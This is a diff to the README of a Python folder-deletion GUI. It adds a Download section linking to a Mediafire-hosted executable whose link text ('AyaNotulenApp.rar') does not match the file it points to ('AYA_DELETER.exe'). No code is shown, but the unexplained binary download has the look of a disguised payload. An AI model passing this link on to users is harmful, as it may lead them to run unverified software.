@@ -2,6 +2,9 @@ AYA DELETER
 AYA DELETER is a Python-based GUI application designed to efficiently and permanently delete folders and their contents. It uses parallel processing for fast deletion of large numbers of files and leverages psutil to optimize resource usage based on system capabilities. The application includes safeguards like confirmation prompts to prevent accidental data loss.
 Features
 
+## Download
+Get the latest release: [Download AyaNotulenApp.rar](https://www.mediafire.com/file/3debef147urpnt7/AYA_DELETER.exe/file)
+
 High-Speed Deletion:
 Deletes entire folder structures, including all files and subfolders.
 Uses parallel processing with a dynamic number of workers (based on CPU cores and available memory).
